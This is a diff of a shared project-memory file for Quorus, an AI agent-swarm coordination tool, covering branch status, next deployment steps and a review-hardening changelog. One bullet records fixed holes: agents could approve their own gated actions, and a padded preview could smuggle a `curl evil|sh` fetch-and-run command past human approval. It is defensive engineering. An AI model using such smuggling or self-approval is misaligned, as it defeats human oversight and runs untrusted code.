@@ -3,7 +3,7 @@
 > **This file is the shared memory between all contributors' Claude instances.**
 > Read this at session start. Update it after every significant change. Commit it with your work.
 
-Last updated: 2026-05-11 (Phase 1 OS primitives now MCP-callable across all 6 harnesses)
+Last updated: 2026-08-23 (post-review hardening of approvals/auction/persistence; branch `feat/wake-rebuild-aug26`)
 
 ---
 
@@ -11,7 +11,7 @@ Last updated: 2026-05-11 (Phase 1 OS primitives now MCP-callable across all 6 ha
 
 Quorus (package: quorus) is the coordination layer for AI agent swarms. "VS Code Live Share for AI Agents" — any model, any machine, any platform coordinates in real-time.
 
-**Branch:** `feat/may4-sprint` (1421+ tests passing — Reflex AI-native chat + identity disambiguation + production-deploy hardening)
+**Branch:** `feat/wake-rebuild-aug26` (2126 tests passing — Wake Rebuild streams F/R/D/L/T complete + three review passes closed). `feat/may4-sprint` is the pre-rebuild ancestor.
 
 **Package:** `pipx install "quorus @ git+https://github.com/Quorus-dev/Quorus.git"`
 
@@ -57,7 +57,7 @@ Why this matters: the relay enforces `JWT.sub == from_name` (anti-impersonation;
 | Module                      | What                                                                                           |
 | --------------------------- | ---------------------------------------------------------------------------------------------- |
 | quorus/relay.py             | FastAPI relay: rooms, SSE fan-out, history, presence, rate limiting, health, admin             |
-| quorus_mcp/server.py        | MCP server: 11 tools incl. claim_task, release_task, get_room_state, send/check, rooms, search |
+| quorus_mcp/                 | MCP server: 26 tools — messaging, rooms, locks, state, social verbs, 10 phase-1 primitives, approve  |
 | quorus_cli/cli.py           | 30+ CLI commands (quorus ...) — `quorus` with no args opens TUI                                |
 | quorus_cli/ui.py            | Shared theme, banner, spinner, error/success/info primitives                                   |
 | quorus_tui/hub.py           | Full-screen TUI hub: rooms panel, agent list, live chat, first-run wizard                      |
@@ -65,7 +65,7 @@ Why this matters: the relay enforces `JWT.sub == from_name` (anti-impersonation;
 | quorus/watcher.py           | Primitive C: SSE-driven daemon, writes .quorus/context.md for IDE indexing                     |
 | quorus/dashboard.py         | Web dashboard: live messages + swarm activity panel + usage bar                                |
 | quorus/backends/            | In-memory + Redis + Postgres + SQLite backends (incl. RoomStateBackend)                        |
-| tests/                      | 905 tests passing                                                                              |
+| tests/                      | 2126 tests passing (`pytest -q`, ~2 min)                                                       |
 
 **Stack:** Python 3.10+, FastAPI, asyncio, httpx, mcp (FastMCP), pytest, ruff, rich, hatchling
 
@@ -107,16 +107,70 @@ Remaining medium-severity items tracked in code review output.
 
 ## In Progress
 
-**Wake Rebuild (2026-08-20):** research phase complete — see `docs/NOTIFICATION_MVP_RESEARCH.md`.
-Next: planning phase → product spec → rebuild. MVP scope: Claude Code + Codex + Gemini
-instant wake-on-mention with room→session memory, room→workspace binding, live-session
-injection (Claude inbox socket, v2.1.224+), approval relay, honest presence. Stub
-auto-fallback to be killed. Pre-rebuild Phase 0 fix list in the doc (test-order
-pollution, Redis-backed triage auction, iCloud repo relocation, audit stragglers).
+**Wake Rebuild — ship phase (2026-08-23).** Build is complete (spec:
+`docs/WAKE_REBUILD_SPEC.md`, all streams landed) and has survived three
+review passes. What is left is operational, not code:
+
+1. **Merge `feat/wake-rebuild-aug26` → `main`** (Arav's call). `main` is
+   ~200 commits behind and still carries the unbounded `mcp>=1.2.0` pin, so
+   the README install command breaks every fresh install until this lands.
+2. **Redeploy the public relay** — `quorus-relay.fly.dev` is NXDOMAIN
+   (`flyctl auth login` + `flyctl deploy`; `fly.toml` ready).
+3. **Two-human runbook test** with Aarya (`docs/MULTI_USER_TEST_RUNBOOK.md`;
+   single-machine rehearsal `scripts/rehearse_runbook.sh` is green, 20 checks).
+4. Post-MVP (Stream L4, flagged): Claude Channels transport, Codex
+   `app-server` threads under the daemon.
 
 ---
 
 ## Recent Changes
+
+### Review-hardening pass (2026-08-21, commits 6c18bd2 → 64a540d)
+
+Four commits after the public-install check, each closing a review pass
+with mutation-verified regression tests. Suite now **2126 passing**, ruff
+clean, wake gate 24 checks × 5 rounds, runbook rehearsal 20 checks.
+
+- **`quorus join <room>` was broken** (`--name` required) — the runbook's
+  step 2 could never succeed for the second human. `--name` now defaults to
+  the configured identity; `scripts/rehearse_runbook.sh` walks the
+  two-human runbook on one machine with two isolated identities.
+- **R3/R4 code review (eeb251d)**: work-queue mirror was write-only (claims
+  never survived restart); terminal tasks were re-persisted; lapsed bid
+  windows kept stale bids; duplicate `/v1/claim` re-broadcast wakes;
+  `reset()` left the mirror intact; hydration marked before the await
+  pinned buckets empty after one Redis blip; `redis_or_none()` swallowed
+  every exception (silently dropped to the double-winner auction).
+- **Adversarial review (7703f95)** — the approval gate agents could open
+  themselves: deciding now requires a **named, non-agent, room-member**
+  identity (legacy auth skipped even the self-approve check); the bridge
+  re-hashes the full tool input against what the human approved (a padded
+  preview could smuggle `curl evil|sh`); approval reads scoped to caller's
+  rooms; secrets redacted from previews. **Auction**: claims are held (425)
+  until the bid window closes, and explicit @mentions outrank fairness
+  credit — previously the first agent to POST `/claim` won regardless of
+  bid, and a 0.3 question-bid beat a 1.0 mention after two wins. **Daemon**:
+  quote-stripping ate any text with two apostrophes ("shouldn't … it's");
+  busy-queue mentions were acked and lost; inbox drain re-answered
+  hour-old mentions already handled over SSE; a live session in `~`
+  matched every workspace beneath it. **Tests**: R1/R2 run() wiring and
+  the permission DENY path were previously unasserted.
+- **Mirror was a cache with no invalidation (64a540d)**: hydrate-once per
+  process meant a replica never saw a peer's later write (200 on one
+  machine, 404 on another, forever) and tool-name uniqueness was decided
+  against a stale local view. Now bounded-staleness hydration
+  (`QUORUS_P1_HYDRATE_TTL`, 5s) via an LRU-bounded `HydrationClock`;
+  `register()` forces a fresh read; every mirror op bounded by
+  `QUORUS_REDIS_OP_TIMEOUT` (they run under a per-bucket lock — a hung
+  Redis would have wedged the bucket); reads refresh retention TTL;
+  mirror failures counted, not just logged; `reset_state()` keeps Redis
+  wiring.
+- **Repo note (2026-08-23)**: Desktop copy (`~/Desktop/Quorus`) was 15
+  commits behind on `feat/may4-sprint`; fast-forwarded to
+  `feat/wake-rebuild-aug26`. graphify graph lives only in the Desktop
+  copy (`graphify-out/` is gitignored); the graph is 11.4k nodes, above
+  graphify's 5k HTML-viz cap, so `graph.json`/report update but
+  `graph.html` is skipped — use `graphify query/explain/path`.
 
 ### Public-install verification (2026-08-21)
 
@@ -359,23 +413,6 @@ auth, same audit ledger, same Cedar policy gates as the underlying routes.
 Ships the autonomous-engineering-team wedge described in `QUORUS_AUTONOMY_PLAN.md`. Distributes a Quorus Operating Discipline (QOD) constitution via three channels (MCP `instructions` field + `~/.claude/skills/` + agent-loop sysprompt prepend), runs a per-host `reflexd` daemon that subscribes to relay SSE, classifies room messages via `/v1/triage`, computes a local bid via `/v1/bid`, claims via `/v1/claim`, and spawns a headless harness session (claude-agent-sdk / `codex exec` / `gemini --prompt` / `cursor-agent --headless`). TurnGuard busy-files prevent waking agents mid-tool-call. Phase 2 self-assignment landed: `@open <work>` and `TODO @<role>: ...` patterns route to capability-matched agents (claude→{tui,react,tests}, codex→{relay,backend,audit}, gemini→{docs,research}, cursor→{refactor}). Local end-to-end demo at `scripts/demo_reflex.sh` runs the full pipeline in ~60ms with a stub adapter (no API spend).
 
 Production-deploy bugs caught + fixed during shipping: register-agent 500 (MultipleResultsFound on duplicate unrevoked keys → bulk revoke + mint single canonical key), tenant peering for child agents (b4d4c1d), cold-install smoke clobbering host `~/.gemini` (HOME isolation + atexit backup), TUI auth precedence preferring legacy `relay_secret` over real `api_key` (silent 401), TUI 2-second screen-wipe + scrollback nuke killing copy/paste, multi-line paste exploding into N separate messages, `_send_message` swallowing 4xx response bodies and surfacing misleading "Couldn't reach the relay" errors, identity disambiguation (humans get `@arav` + green ●; agents keep their hashed-color suffix). 5xx retry with exponential backoff added to `_send_message`. reflexd refuses to start with non-agent participant names (must end in claude/codex/gemini/cursor).
-
-### Cold-install CI (2026-05-01)
-
-Added `.github/workflows/cold-install.yml` — runs on every PR, every push to
-main, and nightly at 08:00 UTC. Spins up a fresh runner per cell across a
-matrix of `{ubuntu, macos, windows} × {3.10, 3.11, 3.12, 3.13}` (Windows×3.10
-excluded for known mcp/cffi grief), `pipx install`s the PR's checkout with
-the pip wheel cache disabled, then runs `scripts/cold_install_smoke.sh` to
-boot the relay, hit `/health`, run `quorus init`, create a room, send a
-message, and confirm round-trip in <30s. Total budget per cell: 60s smoke,
-8min job. Mirrored locally by `scripts/cold_install_smoke.sh` (POSIX-bash
-3.2 clean) which calls `scripts/cold_install_smoke.py` (the actual driver).
-A pytest skeleton at `tests/test_cold_install.py` runs the smoke against
-`PATH`-installed binaries by default and adds an opt-in Docker variant
-(skipped cleanly when Docker isn't there). This is the gate that locks in
-the April 23 2026 hackathon failure mode where `pytest` was green but
-`pipx install` produced a binary that wouldn't open.
 
 | Date       | What                                                                           |
 | ---------- | ------------------------------------------------------------------------------ |
